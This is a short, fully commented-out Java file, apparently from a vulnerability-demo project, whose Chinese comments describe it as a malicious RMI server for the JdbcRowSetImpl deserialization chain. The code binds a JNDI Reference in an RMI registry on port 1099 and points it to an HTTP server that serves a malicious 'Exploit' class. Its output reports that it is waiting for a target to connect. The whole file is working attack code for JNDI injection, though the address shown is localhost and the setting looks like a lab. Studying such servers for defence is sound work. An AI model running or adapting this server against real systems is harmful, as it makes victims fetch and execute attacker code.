//package com.example.vuln.server;
//
//import com.sun.jndi.rmi.registry.ReferenceWrapper;
//
//import javax.naming.Reference;
//import java.rmi.registry.LocateRegistry;
//import java.rmi.registry.Registry;
//
///**Registry
// * 恶意RMI服务器
// * 用于配合JdbcRowSetImpl利用链
// */
//public class RMIServer {
//
//    public static void main(String[] args) {
//        try {
//            // 创建RMI注册表，监听1099端口
//            Registry registry = LocateRegistry.createRegistry(1099);
//
//            // 创建恶意引用
//            // 参数：className, factory, factoryLocation
//            // factoryLocation指向存放恶意class文件的HTTP服务器
//            String httpServer = "http://127.0.0.1:8000/";
//            String className = "Exploit";
//
//            Reference reference = new Reference(
//                    className,
//                    className,
//                    httpServer
//            );
//
//            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
//            registry.bind("Exploit", wrapper);
//
//            System.out.println("RMI服务器启动成功，监听端口: 1099");
//            System.out.println("恶意类加载地址: " + httpServer + className + ".class");
//            System.out.println("等待目标连接...");
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//}